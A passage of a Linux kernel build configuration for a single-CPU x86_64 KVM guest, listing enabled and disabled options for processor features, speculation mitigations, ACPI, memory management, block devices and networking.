CONFIG_CC_IMPLICIT_FALLTHROUGH=""-Wimplicit-fallthrough=5""
CONFIG_GCC12_NO_ARRAY_BOUNDS=y
CONFIG_ARCH_SUPPORTS_INT128=y
CONFIG_CGROUPS=y
# CONFIG_CGROUP_FAVOR_DYNMODS is not set
# CONFIG_MEMCG is not set
# CONFIG_BLK_CGROUP is not set
# CONFIG_CGROUP_SCHED is not set
# CONFIG_CGROUP_PIDS is not set
# CONFIG_CGROUP_RDMA is not set
# CONFIG_CGROUP_FREEZER is not set
# CONFIG_CGROUP_DEVICE is not set
# CONFIG_CGROUP_CPUACCT is not set
# CONFIG_CGROUP_PERF is not set
CONFIG_CGROUP_BPF=y
# CONFIG_CGROUP_MISC is not set
# CONFIG_CGROUP_DEBUG is not set
CONFIG_SOCK_CGROUP_DATA=y
CONFIG_NAMESPACES=y
CONFIG_UTS_NS=y
CONFIG_TIME_NS=y
CONFIG_IPC_NS=y
CONFIG_USER_NS=y
CONFIG_PID_NS=y
CONFIG_NET_NS=y
CONFIG_CHECKPOINT_RESTORE=y
# CONFIG_SCHED_AUTOGROUP is not set
# CONFIG_SYSFS_DEPRECATED is not set
# CONFIG_RELAY is not set
# CONFIG_BLK_DEV_INITRD is not set
# CONFIG_BOOT_CONFIG is not set
CONFIG_INITRAMFS_PRESERVE_MTIME=y
CONFIG_CC_OPTIMIZE_FOR_PERFORMANCE=y
# CONFIG_CC_OPTIMIZE_FOR_SIZE is not set
CONFIG_LD_ORPHAN_WARN=y
CONFIG_SYSCTL=y
CONFIG_HAVE_UID16=y
CONFIG_SYSCTL_EXCEPTION_TRACE=y
CONFIG_HAVE_PCSPKR_PLATFORM=y
# CONFIG_EXPERT is not set
CONFIG_UID16=y
CONFIG_MULTIUSER=y
CONFIG_SGETMASK_SYSCALL=y
CONFIG_SYSFS_SYSCALL=y
CONFIG_FHANDLE=y
CONFIG_POSIX_TIMERS=y
CONFIG_PRINTK=y
CONFIG_BUG=y
CONFIG_ELF_CORE=y
CONFIG_PCSPKR_PLATFORM=y
CONFIG_BASE_FULL=y
CONFIG_FUTEX=y
CONFIG_FUTEX_PI=y
CONFIG_EPOLL=y
CONFIG_SIGNALFD=y
CONFIG_TIMERFD=y
CONFIG_EVENTFD=y
CONFIG_SHMEM=y
CONFIG_AIO=y
CONFIG_IO_URING=y
CONFIG_ADVISE_SYSCALLS=y
CONFIG_MEMBARRIER=y
CONFIG_KALLSYMS=y
# CONFIG_KALLSYMS_ALL is not set
CONFIG_KALLSYMS_BASE_RELATIVE=y
CONFIG_ARCH_HAS_MEMBARRIER_SYNC_CORE=y
CONFIG_KCMP=y
CONFIG_RSEQ=y
# CONFIG_EMBEDDED is not set
CONFIG_HAVE_PERF_EVENTS=y

#
# Kernel Performance Events And Counters
#
CONFIG_PERF_EVENTS=y
# CONFIG_DEBUG_PERF_USE_VMALLOC is not set
# end of Kernel Performance Events And Counters

# CONFIG_PROFILING is not set
# end of General setup

CONFIG_64BIT=y
CONFIG_X86_64=y
CONFIG_X86=y
CONFIG_INSTRUCTION_DECODER=y
CONFIG_OUTPUT_FORMAT=""elf64-x86-64""
CONFIG_LOCKDEP_SUPPORT=y
CONFIG_STACKTRACE_SUPPORT=y
CONFIG_MMU=y
CONFIG_ARCH_MMAP_RND_BITS_MIN=28
CONFIG_ARCH_MMAP_RND_BITS_MAX=32
CONFIG_ARCH_MMAP_RND_COMPAT_BITS_MIN=8
CONFIG_ARCH_MMAP_RND_COMPAT_BITS_MAX=16
CONFIG_GENERIC_ISA_DMA=y
CONFIG_GENERIC_BUG=y
CONFIG_GENERIC_BUG_RELATIVE_POINTERS=y
CONFIG_ARCH_MAY_HAVE_PC_FDC=y
CONFIG_GENERIC_CALIBRATE_DELAY=y
CONFIG_ARCH_HAS_CPU_RELAX=y
CONFIG_ARCH_HIBERNATION_POSSIBLE=y
CONFIG_ARCH_NR_GPIO=1024
CONFIG_ARCH_SUSPEND_POSSIBLE=y
CONFIG_AUDIT_ARCH=y
CONFIG_ARCH_SUPPORTS_UPROBES=y
CONFIG_FIX_EARLYCON_MEM=y
CONFIG_PGTABLE_LEVELS=4
CONFIG_CC_HAS_SANE_STACKPROTECTOR=y

#
# Processor type and features
#
# CONFIG_SMP is not set
CONFIG_X86_FEATURE_NAMES=y
# CONFIG_X86_X2APIC is not set
# CONFIG_X86_MPPARSE is not set
# CONFIG_GOLDFISH is not set
# CONFIG_X86_CPU_RESCTRL is not set
# CONFIG_X86_EXTENDED_PLATFORM is not set
# CONFIG_X86_INTEL_LPSS is not set
# CONFIG_X86_AMD_PLATFORM_DEVICE is not set
# CONFIG_IOSF_MBI is not set
CONFIG_SCHED_OMIT_FRAME_POINTER=y
CONFIG_HYPERVISOR_GUEST=y
CONFIG_PARAVIRT=y
# CONFIG_PARAVIRT_DEBUG is not set
CONFIG_X86_HV_CALLBACK_VECTOR=y
# CONFIG_XEN is not set
CONFIG_KVM_GUEST=y
CONFIG_ARCH_CPUIDLE_HALTPOLL=y
# CONFIG_PVH is not set
# CONFIG_PARAVIRT_TIME_ACCOUNTING is not set
CONFIG_PARAVIRT_CLOCK=y
# CONFIG_JAILHOUSE_GUEST is not set
# CONFIG_ACRN_GUEST is not set
# CONFIG_MK8 is not set
# CONFIG_MPSC is not set
CONFIG_MCORE2=y
# CONFIG_MATOM is not set
# CONFIG_GENERIC_CPU is not set
CONFIG_X86_INTERNODE_CACHE_SHIFT=6
CONFIG_X86_L1_CACHE_SHIFT=6
CONFIG_X86_INTEL_USERCOPY=y
CONFIG_X86_USE_PPRO_CHECKSUM=y
CONFIG_X86_P6_NOP=y
CONFIG_X86_TSC=y
CONFIG_X86_CMPXCHG64=y
CONFIG_X86_CMOV=y
CONFIG_X86_MINIMUM_CPU_FAMILY=64
CONFIG_X86_DEBUGCTLMSR=y
CONFIG_IA32_FEAT_CTL=y
CONFIG_X86_VMX_FEATURE_NAMES=y
CONFIG_CPU_SUP_INTEL=y
CONFIG_CPU_SUP_AMD=y
CONFIG_CPU_SUP_HYGON=y
CONFIG_CPU_SUP_CENTAUR=y
CONFIG_CPU_SUP_ZHAOXIN=y
CONFIG_HPET_TIMER=y
CONFIG_DMI=y
# CONFIG_GART_IOMMU is not set
CONFIG_NR_CPUS_RANGE_BEGIN=1
CONFIG_NR_CPUS_RANGE_END=1
CONFIG_NR_CPUS_DEFAULT=1
CONFIG_NR_CPUS=1
CONFIG_UP_LATE_INIT=y
CONFIG_X86_LOCAL_APIC=y
CONFIG_X86_IO_APIC=y
# CONFIG_X86_REROUTE_FOR_BROKEN_BOOT_IRQS is not set
# CONFIG_X86_MCE is not set

#
# Performance monitoring
#
CONFIG_PERF_EVENTS_INTEL_UNCORE=y
# CONFIG_PERF_EVENTS_INTEL_RAPL is not set
# CONFIG_PERF_EVENTS_INTEL_CSTATE is not set
# CONFIG_PERF_EVENTS_AMD_POWER is not set
CONFIG_PERF_EVENTS_AMD_UNCORE=y
# CONFIG_PERF_EVENTS_AMD_BRS is not set
# end of Performance monitoring

CONFIG_X86_16BIT=y
CONFIG_X86_ESPFIX64=y
CONFIG_X86_VSYSCALL_EMULATION=y
# CONFIG_X86_IOPL_IOPERM is not set
# CONFIG_MICROCODE is not set
# CONFIG_X86_MSR is not set
# CONFIG_X86_CPUID is not set
# CONFIG_X86_5LEVEL is not set
CONFIG_X86_DIRECT_GBPAGES=y
# CONFIG_AMD_MEM_ENCRYPT is not set
CONFIG_ARCH_SPARSEMEM_ENABLE=y
CONFIG_ARCH_SPARSEMEM_DEFAULT=y
CONFIG_ILLEGAL_POINTER_VALUE=0xdead000000000000
# CONFIG_X86_PMEM_LEGACY is not set
# CONFIG_X86_CHECK_BIOS_CORRUPTION is not set
CONFIG_MTRR=y
CONFIG_MTRR_SANITIZER=y
CONFIG_MTRR_SANITIZER_ENABLE_DEFAULT=0
CONFIG_MTRR_SANITIZER_SPARE_REG_NR_DEFAULT=1
CONFIG_X86_PAT=y
CONFIG_ARCH_USES_PG_UNCACHED=y
CONFIG_X86_UMIP=y
CONFIG_CC_HAS_IBT=y
# CONFIG_X86_KERNEL_IBT is not set
CONFIG_X86_INTEL_MEMORY_PROTECTION_KEYS=y
CONFIG_X86_INTEL_TSX_MODE_OFF=y
# CONFIG_X86_INTEL_TSX_MODE_ON is not set
# CONFIG_X86_INTEL_TSX_MODE_AUTO is not set
CONFIG_EFI=y
CONFIG_EFI_STUB=y
# CONFIG_EFI_MIXED is not set
# CONFIG_HZ_100 is not set
CONFIG_HZ_250=y
# CONFIG_HZ_300 is not set
# CONFIG_HZ_1000 is not set
CONFIG_HZ=250
CONFIG_SCHED_HRTICK=y
# CONFIG_KEXEC is not set
# CONFIG_KEXEC_FILE is not set
# CONFIG_CRASH_DUMP is not set
CONFIG_PHYSICAL_START=0x1000000
CONFIG_RELOCATABLE=y
CONFIG_RANDOMIZE_BASE=y
CONFIG_X86_NEED_RELOCS=y
CONFIG_PHYSICAL_ALIGN=0x200000
CONFIG_DYNAMIC_MEMORY_LAYOUT=y
CONFIG_RANDOMIZE_MEMORY=y
CONFIG_RANDOMIZE_MEMORY_PHYSICAL_PADDING=0x0
# CONFIG_COMPAT_VDSO is not set
# CONFIG_LEGACY_VSYSCALL_XONLY is not set
CONFIG_LEGACY_VSYSCALL_NONE=y
# CONFIG_CMDLINE_BOOL is not set
CONFIG_MODIFY_LDT_SYSCALL=y
# CONFIG_STRICT_SIGALTSTACK_SIZE is not set
CONFIG_HAVE_LIVEPATCH=y
# end of Processor type and features

CONFIG_CC_HAS_SLS=y
CONFIG_CC_HAS_RETURN_THUNK=y
CONFIG_SPECULATION_MITIGATIONS=y
CONFIG_PAGE_TABLE_ISOLATION=y
CONFIG_RETPOLINE=y
CONFIG_RETHUNK=y
CONFIG_CPU_UNRET_ENTRY=y
CONFIG_CPU_IBPB_ENTRY=y
CONFIG_CPU_IBRS_ENTRY=y
# CONFIG_SLS is not set
CONFIG_ARCH_HAS_ADD_PAGES=y
CONFIG_ARCH_MHP_MEMMAP_ON_MEMORY_ENABLE=y

#
# Power management and ACPI options
#
# CONFIG_SUSPEND is not set
# CONFIG_HIBERNATION is not set
# CONFIG_PM is not set
CONFIG_ARCH_SUPPORTS_ACPI=y
CONFIG_ACPI=y
CONFIG_ACPI_LEGACY_TABLES_LOOKUP=y
CONFIG_ARCH_MIGHT_HAVE_ACPI_PDC=y
CONFIG_ACPI_SYSTEM_POWER_STATES_SUPPORT=y
# CONFIG_ACPI_DEBUGGER is not set
# CONFIG_ACPI_SPCR_TABLE is not set
# CONFIG_ACPI_FPDT is not set
CONFIG_ACPI_LPIT=y
CONFIG_ACPI_REV_OVERRIDE_POSSIBLE=y
# CONFIG_ACPI_EC_DEBUGFS is not set
# CONFIG_ACPI_AC is not set
# CONFIG_ACPI_BATTERY is not set
CONFIG_ACPI_BUTTON=m
# CONFIG_ACPI_TINY_POWER_BUTTON is not set
# CONFIG_ACPI_FAN is not set
# CONFIG_ACPI_DOCK is not set
CONFIG_ACPI_CPU_FREQ_PSS=y
CONFIG_ACPI_PROCESSOR_CSTATE=y
CONFIG_ACPI_PROCESSOR_IDLE=y
CONFIG_ACPI_PROCESSOR=m
# CONFIG_ACPI_PROCESSOR_AGGREGATOR is not set
# CONFIG_ACPI_THERMAL is not set
CONFIG_ARCH_HAS_ACPI_TABLE_UPGRADE=y
# CONFIG_ACPI_DEBUG is not set
# CONFIG_ACPI_PCI_SLOT is not set
# CONFIG_ACPI_CONTAINER is not set
CONFIG_ACPI_HOTPLUG_IOAPIC=y
# CONFIG_ACPI_SBS is not set
# CONFIG_ACPI_HED is not set
# CONFIG_ACPI_BGRT is not set
# CONFIG_ACPI_NFIT is not set
CONFIG_HAVE_ACPI_APEI=y
CONFIG_HAVE_ACPI_APEI_NMI=y
# CONFIG_ACPI_APEI is not set
# CONFIG_ACPI_DPTF is not set
CONFIG_ACPI_CONFIGFS=m
# CONFIG_ACPI_PFRUT is not set
# CONFIG_PMIC_OPREGION is not set
CONFIG_ACPI_PRMT=y
CONFIG_X86_PM_TIMER=y

#
# CPU Frequency scaling
#
# CONFIG_CPU_FREQ is not set
# end of CPU Frequency scaling

#
# CPU Idle
#
CONFIG_CPU_IDLE=y
CONFIG_CPU_IDLE_GOV_LADDER=y
CONFIG_CPU_IDLE_GOV_MENU=y
# CONFIG_CPU_IDLE_GOV_TEO is not set
CONFIG_CPU_IDLE_GOV_HALTPOLL=y
CONFIG_HALTPOLL_CPUIDLE=m
# end of CPU Idle

# CONFIG_INTEL_IDLE is not set
# end of Power management and ACPI options

#
# Bus options (PCI etc.)
#
CONFIG_PCI_DIRECT=y
CONFIG_PCI_MMCONFIG=y
CONFIG_MMCONF_FAM10H=y
CONFIG_ISA_DMA_API=y
CONFIG_AMD_NB=y
# end of Bus options (PCI etc.)

#
# Binary Emulations
#
CONFIG_IA32_EMULATION=y
# CONFIG_X86_X32_ABI is not set
CONFIG_COMPAT_32=y
CONFIG_COMPAT=y
CONFIG_COMPAT_FOR_U64_ALIGNMENT=y
# end of Binary Emulations

CONFIG_HAVE_KVM=y
CONFIG_VIRTUALIZATION=y
# CONFIG_KVM is not set
CONFIG_AS_AVX512=y
CONFIG_AS_SHA1_NI=y
CONFIG_AS_SHA256_NI=y
CONFIG_AS_TPAUSE=y

#
# General architecture-dependent options
#
CONFIG_GENERIC_ENTRY=y
# CONFIG_KPROBES is not set
# CONFIG_JUMP_LABEL is not set
# CONFIG_STATIC_CALL_SELFTEST is not set
CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS=y
CONFIG_ARCH_USE_BUILTIN_BSWAP=y
CONFIG_HAVE_IOREMAP_PROT=y
CONFIG_HAVE_KPROBES=y
CONFIG_HAVE_KRETPROBES=y
CONFIG_HAVE_OPTPROBES=y
CONFIG_HAVE_KPROBES_ON_FTRACE=y
CONFIG_ARCH_CORRECT_STACKTRACE_ON_KRETPROBE=y
CONFIG_HAVE_FUNCTION_ERROR_INJECTION=y
CONFIG_HAVE_NMI=y
CONFIG_TRACE_IRQFLAGS_SUPPORT=y
CONFIG_TRACE_IRQFLAGS_NMI_SUPPORT=y
CONFIG_HAVE_ARCH_TRACEHOOK=y
CONFIG_HAVE_DMA_CONTIGUOUS=y
CONFIG_GENERIC_SMP_IDLE_THREAD=y
CONFIG_ARCH_HAS_FORTIFY_SOURCE=y
CONFIG_ARCH_HAS_SET_MEMORY=y
CONFIG_ARCH_HAS_SET_DIRECT_MAP=y
CONFIG_HAVE_ARCH_THREAD_STRUCT_WHITELIST=y
CONFIG_ARCH_WANTS_DYNAMIC_TASK_STRUCT=y
CONFIG_ARCH_WANTS_NO_INSTR=y
CONFIG_HAVE_ASM_MODVERSIONS=y
CONFIG_HAVE_REGS_AND_STACK_ACCESS_API=y
CONFIG_HAVE_RSEQ=y
CONFIG_HAVE_RUST=y
CONFIG_HAVE_FUNCTION_ARG_ACCESS_API=y
CONFIG_HAVE_HW_BREAKPOINT=y
CONFIG_HAVE_MIXED_BREAKPOINTS_REGS=y
CONFIG_HAVE_USER_RETURN_NOTIFIER=y
CONFIG_HAVE_PERF_EVENTS_NMI=y
CONFIG_HAVE_HARDLOCKUP_DETECTOR_PERF=y
CONFIG_HAVE_PERF_REGS=y
CONFIG_HAVE_PERF_USER_STACK_DUMP=y
CONFIG_HAVE_ARCH_JUMP_LABEL=y
CONFIG_HAVE_ARCH_JUMP_LABEL_RELATIVE=y
CONFIG_MMU_GATHER_TABLE_FREE=y
CONFIG_MMU_GATHER_RCU_TABLE_FREE=y
CONFIG_MMU_GATHER_MERGE_VMAS=y
CONFIG_ARCH_HAVE_NMI_SAFE_CMPXCHG=y
CONFIG_HAVE_ALIGNED_STRUCT_PAGE=y
CONFIG_HAVE_CMPXCHG_LOCAL=y
CONFIG_HAVE_CMPXCHG_DOUBLE=y
CONFIG_ARCH_WANT_COMPAT_IPC_PARSE_VERSION=y
CONFIG_ARCH_WANT_OLD_COMPAT_IPC=y
CONFIG_HAVE_ARCH_SECCOMP=y
CONFIG_HAVE_ARCH_SECCOMP_FILTER=y
CONFIG_SECCOMP=y
CONFIG_SECCOMP_FILTER=y
# CONFIG_SECCOMP_CACHE_DEBUG is not set
CONFIG_HAVE_ARCH_STACKLEAK=y
CONFIG_HAVE_STACKPROTECTOR=y
CONFIG_STACKPROTECTOR=y
CONFIG_STACKPROTECTOR_STRONG=y
CONFIG_ARCH_SUPPORTS_LTO_CLANG=y
CONFIG_ARCH_SUPPORTS_LTO_CLANG_THIN=y
CONFIG_LTO_NONE=y
CONFIG_ARCH_SUPPORTS_CFI_CLANG=y
CONFIG_HAVE_ARCH_WITHIN_STACK_FRAMES=y
CONFIG_HAVE_CONTEXT_TRACKING_USER=y
CONFIG_HAVE_CONTEXT_TRACKING_USER_OFFSTACK=y
CONFIG_HAVE_VIRT_CPU_ACCOUNTING_GEN=y
CONFIG_HAVE_IRQ_TIME_ACCOUNTING=y
CONFIG_HAVE_MOVE_PUD=y
CONFIG_HAVE_MOVE_PMD=y
CONFIG_HAVE_ARCH_TRANSPARENT_HUGEPAGE=y
CONFIG_HAVE_ARCH_TRANSPARENT_HUGEPAGE_PUD=y
CONFIG_HAVE_ARCH_HUGE_VMAP=y
CONFIG_HAVE_ARCH_HUGE_VMALLOC=y
CONFIG_ARCH_WANT_HUGE_PMD_SHARE=y
CONFIG_HAVE_ARCH_SOFT_DIRTY=y
CONFIG_HAVE_MOD_ARCH_SPECIFIC=y
CONFIG_MODULES_USE_ELF_RELA=y
CONFIG_HAVE_IRQ_EXIT_ON_IRQ_STACK=y
CONFIG_HAVE_SOFTIRQ_ON_OWN_STACK=y
CONFIG_SOFTIRQ_ON_OWN_STACK=y
CONFIG_ARCH_HAS_ELF_RANDOMIZE=y
CONFIG_HAVE_ARCH_MMAP_RND_BITS=y
CONFIG_HAVE_EXIT_THREAD=y
CONFIG_ARCH_MMAP_RND_BITS=28
CONFIG_HAVE_ARCH_MMAP_RND_COMPAT_BITS=y
CONFIG_ARCH_MMAP_RND_COMPAT_BITS=8
CONFIG_HAVE_ARCH_COMPAT_MMAP_BASES=y
CONFIG_PAGE_SIZE_LESS_THAN_64KB=y
CONFIG_PAGE_SIZE_LESS_THAN_256KB=y
CONFIG_HAVE_OBJTOOL=y
CONFIG_HAVE_JUMP_LABEL_HACK=y
CONFIG_HAVE_NOINSTR_HACK=y
CONFIG_HAVE_NOINSTR_VALIDATION=y
CONFIG_HAVE_UACCESS_VALIDATION=y
CONFIG_HAVE_STACK_VALIDATION=y
CONFIG_HAVE_RELIABLE_STACKTRACE=y
CONFIG_OLD_SIGSUSPEND3=y
CONFIG_COMPAT_OLD_SIGACTION=y
CONFIG_COMPAT_32BIT_TIME=y
CONFIG_HAVE_ARCH_VMAP_STACK=y
CONFIG_VMAP_STACK=y
CONFIG_HAVE_ARCH_RANDOMIZE_KSTACK_OFFSET=y
CONFIG_RANDOMIZE_KSTACK_OFFSET=y
# CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT is not set
CONFIG_ARCH_HAS_STRICT_KERNEL_RWX=y
CONFIG_STRICT_KERNEL_RWX=y
CONFIG_ARCH_HAS_STRICT_MODULE_RWX=y
CONFIG_STRICT_MODULE_RWX=y
CONFIG_HAVE_ARCH_PREL32_RELOCATIONS=y
CONFIG_ARCH_USE_MEMREMAP_PROT=y
CONFIG_ARCH_HAS_MEM_ENCRYPT=y
CONFIG_HAVE_STATIC_CALL=y
CONFIG_HAVE_STATIC_CALL_INLINE=y
CONFIG_HAVE_PREEMPT_DYNAMIC=y
CONFIG_HAVE_PREEMPT_DYNAMIC_CALL=y
CONFIG_ARCH_WANT_LD_ORPHAN_WARN=y
CONFIG_ARCH_SUPPORTS_DEBUG_PAGEALLOC=y
CONFIG_ARCH_SUPPORTS_PAGE_TABLE_CHECK=y
CONFIG_ARCH_HAS_ELFCORE_COMPAT=y
CONFIG_ARCH_HAS_PARANOID_L1D_FLUSH=y
CONFIG_DYNAMIC_SIGFRAME=y
CONFIG_ARCH_HAS_NONLEAF_PMD_YOUNG=y

#
# GCOV-based kernel profiling
#
CONFIG_ARCH_HAS_GCOV_PROFILE_ALL=y
# end of GCOV-based kernel profiling

CONFIG_HAVE_GCC_PLUGINS=y
# CONFIG_GCC_PLUGINS is not set
# end of General architecture-dependent options

CONFIG_RT_MUTEXES=y
CONFIG_BASE_SMALL=0
CONFIG_MODULES=y
# CONFIG_MODULE_FORCE_LOAD is not set
CONFIG_MODULE_UNLOAD=y
# CONFIG_MODULE_FORCE_UNLOAD is not set
# CONFIG_MODULE_UNLOAD_TAINT_TRACKING is not set
# CONFIG_MODVERSIONS is not set
# CONFIG_MODULE_SRCVERSION_ALL is not set
# CONFIG_MODULE_SIG is not set
CONFIG_MODULE_COMPRESS_NONE=y
# CONFIG_MODULE_COMPRESS_GZIP is not set
# CONFIG_MODULE_COMPRESS_XZ is not set
# CONFIG_MODULE_COMPRESS_ZSTD is not set
# CONFIG_MODULE_ALLOW_MISSING_NAMESPACE_IMPORTS is not set
CONFIG_MODPROBE_PATH=""/sbin/modprobe""
CONFIG_MODULES_TREE_LOOKUP=y
CONFIG_BLOCK=y
CONFIG_BLOCK_LEGACY_AUTOLOAD=y
CONFIG_BLK_DEV_BSG_COMMON=y
CONFIG_BLK_ICQ=y
# CONFIG_BLK_DEV_BSGLIB is not set
# CONFIG_BLK_DEV_INTEGRITY is not set
# CONFIG_BLK_DEV_ZONED is not set
# CONFIG_BLK_WBT is not set
# CONFIG_BLK_SED_OPAL is not set
# CONFIG_BLK_INLINE_ENCRYPTION is not set

#
# Partition Types
#
CONFIG_PARTITION_ADVANCED=y
# CONFIG_ACORN_PARTITION is not set
# CONFIG_AIX_PARTITION is not set
# CONFIG_OSF_PARTITION is not set
# CONFIG_AMIGA_PARTITION is not set
# CONFIG_ATARI_PARTITION is not set
# CONFIG_MAC_PARTITION is not set
CONFIG_MSDOS_PARTITION=y
# CONFIG_BSD_DISKLABEL is not set
# CONFIG_MINIX_SUBPARTITION is not set
# CONFIG_SOLARIS_X86_PARTITION is not set
# CONFIG_UNIXWARE_DISKLABEL is not set
# CONFIG_LDM_PARTITION is not set
# CONFIG_SGI_PARTITION is not set
# CONFIG_ULTRIX_PARTITION is not set
# CONFIG_SUN_PARTITION is not set
# CONFIG_KARMA_PARTITION is not set
CONFIG_EFI_PARTITION=y
# CONFIG_SYSV68_PARTITION is not set
# CONFIG_CMDLINE_PARTITION is not set
# end of Partition Types

CONFIG_BLOCK_COMPAT=y
CONFIG_BLK_MQ_PCI=y
CONFIG_BLK_MQ_VIRTIO=y
CONFIG_BLOCK_HOLDER_DEPRECATED=y
CONFIG_BLK_MQ_STACKING=y

#
# IO Schedulers
#
CONFIG_MQ_IOSCHED_DEADLINE=m
CONFIG_MQ_IOSCHED_KYBER=m
CONFIG_IOSCHED_BFQ=m
# end of IO Schedulers

CONFIG_UNINLINE_SPIN_UNLOCK=y
CONFIG_ARCH_SUPPORTS_ATOMIC_RMW=y
CONFIG_ARCH_USE_QUEUED_SPINLOCKS=y
CONFIG_ARCH_USE_QUEUED_RWLOCKS=y
CONFIG_ARCH_HAS_NON_OVERLAPPING_ADDRESS_SPACE=y
CONFIG_ARCH_HAS_SYNC_CORE_BEFORE_USERMODE=y
CONFIG_ARCH_HAS_SYSCALL_WRAPPER=y

#
# Executable file formats
#
CONFIG_BINFMT_ELF=y
CONFIG_COMPAT_BINFMT_ELF=y
CONFIG_ELFCORE=y
CONFIG_CORE_DUMP_DEFAULT_ELF_HEADERS=y
CONFIG_BINFMT_SCRIPT=y
# CONFIG_BINFMT_MISC is not set
CONFIG_COREDUMP=y
# end of Executable file formats

#
# Memory Management options
#
CONFIG_SWAP=y
# CONFIG_ZSWAP is not set

#
# SLAB allocator options
#
# CONFIG_SLAB is not set
CONFIG_SLUB=y
CONFIG_SLAB_MERGE_DEFAULT=y
# CONFIG_SLAB_FREELIST_RANDOM is not set
# CONFIG_SLAB_FREELIST_HARDENED is not set
# CONFIG_SLUB_STATS is not set
# end of SLAB allocator options

# CONFIG_SHUFFLE_PAGE_ALLOCATOR is not set
CONFIG_COMPAT_BRK=y
CONFIG_SPARSEMEM=y
CONFIG_SPARSEMEM_EXTREME=y
CONFIG_SPARSEMEM_VMEMMAP_ENABLE=y
CONFIG_SPARSEMEM_VMEMMAP=y
CONFIG_HAVE_FAST_GUP=y
CONFIG_ARCH_ENABLE_MEMORY_HOTPLUG=y
# CONFIG_MEMORY_HOTPLUG is not set
CONFIG_SPLIT_PTLOCK_CPUS=4
CONFIG_ARCH_ENABLE_SPLIT_PMD_PTLOCK=y
CONFIG_MEMORY_BALLOON=y
CONFIG_BALLOON_COMPACTION=y
CONFIG_COMPACTION=y
CONFIG_COMPACT_UNEVICTABLE_DEFAULT=1
CONFIG_PAGE_REPORTING=y
CONFIG_MIGRATION=y
CONFIG_PHYS_ADDR_T_64BIT=y
# CONFIG_KSM is not set
CONFIG_DEFAULT_MMAP_MIN_ADDR=4096
CONFIG_ARCH_WANT_GENERAL_HUGETLB=y
CONFIG_ARCH_WANTS_THP_SWAP=y
# CONFIG_TRANSPARENT_HUGEPAGE is not set
CONFIG_NEED_PER_CPU_KM=y
CONFIG_NEED_PER_CPU_EMBED_FIRST_CHUNK=y
CONFIG_NEED_PER_CPU_PAGE_FIRST_CHUNK=y
CONFIG_HAVE_SETUP_PER_CPU_AREA=y
# CONFIG_CMA is not set
# CONFIG_MEM_SOFT_DIRTY is not set
CONFIG_GENERIC_EARLY_IOREMAP=y
# CONFIG_IDLE_PAGE_TRACKING is not set
CONFIG_ARCH_HAS_CACHE_LINE_SIZE=y
CONFIG_ARCH_HAS_CURRENT_STACK_POINTER=y
CONFIG_ARCH_HAS_PTE_DEVMAP=y
CONFIG_ZONE_DMA=y
CONFIG_ZONE_DMA32=y
CONFIG_ARCH_USES_HIGH_VMA_FLAGS=y
CONFIG_ARCH_HAS_PKEYS=y
CONFIG_VM_EVENT_COUNTERS=y
# CONFIG_PERCPU_STATS is not set

#
# GUP_TEST needs to have DEBUG_FS enabled
#
CONFIG_ARCH_HAS_PTE_SPECIAL=y
CONFIG_SECRETMEM=y
# CONFIG_ANON_VMA_NAME is not set
# CONFIG_USERFAULTFD is not set
# CONFIG_LRU_GEN is not set

#
# Data Access Monitoring
#
# CONFIG_DAMON is not set
# end of Data Access Monitoring
# end of Memory Management options

CONFIG_NET=y

#
# Networking options
#
# CONFIG_PACKET is not set
CONFIG_UNIX=y
CONFIG_UNIX_SCM=y
CONFIG_AF_UNIX_OOB=y
# CONFIG_UNIX_DIAG is not set
# CONFIG_TLS is not set
# CONFIG_XFRM_USER is not set
# CONFIG_NET_KEY is not set
# CONFIG_XDP_SOCKETS is not set
CONFIG_INET=y
# CONFIG_IP_MULTICAST is not set
# CONFIG_IP_ADVANCED_ROUTER is not set
# CONFIG_IP_PNP is not set
# CONFIG_NET_IPIP is not set
# CONFIG_NET_IPGRE_DEMUX is not set
CONFIG_NET_IP_TUNNEL=m
# CONFIG_SYN_COOKIES is not set
# CONFIG_NET_IPVTI is not set
# CONFIG_NET_FOU is not set
# CONFIG_NET_FOU_IP_TUNNELS is not set
# CONFIG_INET_AH is not set
# CONFIG_INET_ESP is not set
# CONFIG_INET_IPCOMP is not set
CONFIG_INET_TABLE_PERTURB_ORDER=16
CONFIG_INET_TUNNEL=m
CONFIG_INET_DIAG=y
CONFIG_INET_TCP_DIAG=y
# CONFIG_INET_UDP_DIAG is not set
# CONFIG_INET_RAW_DIAG is not set
# CONFIG_INET_DIAG_DESTROY is not set
# CONFIG_TCP_CONG_ADVANCED is not set
CONFIG_TCP_CONG_CUBIC=y
CONFIG_DEFAULT_TCP_CONG=""cubic""
# CONFIG_TCP_MD5SIG is not set
CONFIG_IPV6=y
# CONFIG_IPV6_ROUTER_PREF is not set
# CONFIG_IPV6_OPTIMISTIC_DAD is not set
# CONFIG_INET6_AH is not set
# CONFIG_INET6_ESP is not set
# CONFIG_INET6_IPCOMP is not set
# CONFIG_IPV6_MIP6 is not set
# CONFIG_IPV6_VTI is not set
CONFIG_IPV6_SIT=m
# CONFIG_IPV6_SIT_6RD is not set
CONFIG_IPV6_NDISC_NODETYPE=y
# CONFIG_IPV6_TUNNEL is not set
# CONFIG_IPV6_MULTIPLE_TABLES is not set
# CONFIG_IPV6_MROUTE is not set
# CONFIG_IPV6_SEG6_LWTUNNEL is not set
# CONFIG_IPV6_SEG6_HMAC is not set
# CONFIG_IPV6_RPL_LWTUNNEL is not set
# CONFIG_IPV6_IOAM6_LWTUNNEL is not set
# CONFIG_MPTCP is not set
# CONFIG_NETWORK_SECMARK is not set
# CONFIG_NETWORK_PHY_TIMESTAMPING is not set
# CONFIG_NETFILTER is not set
# CONFIG_BPFILTER is not set
# CONFIG_IP_DCCP is not set
# CONFIG_IP_SCTP is not set
# CONFIG_RDS is not set
# CONFIG_TIPC is not set
# CONFIG_ATM is not set
# CONFIG_L2TP is not set
# CONFIG_BRIDGE is not set
# CONFIG_NET_DSA is not set
# CONFIG_VLAN_8021Q is not set
# CONFIG_LLC2 is not set
# CONFIG_ATALK is not set
# CONFIG_X25 is not set
# CONFIG_LAPB is not set
# CONFIG_PHONET is not set
# CONFIG_6LOWPAN is not set
# CONFIG_IEEE802154 is not set
# CONFIG_NET_SCHED is not set
# CONFIG_DCB is not set
CONFIG_DNS_RESOLVER=m
# CONFIG_BATMAN_ADV is not set
# CONFIG_OPENVSWITCH is not set
# CONFIG_VSOCKETS is not set
# CONFIG_NETLINK_DIAG is not set
# CONFIG_MPLS is not set
# CONFIG_NET_NSH is not set
# CONFIG_HSR is not set
# CONFIG_NET_SWITCHDEV is not set
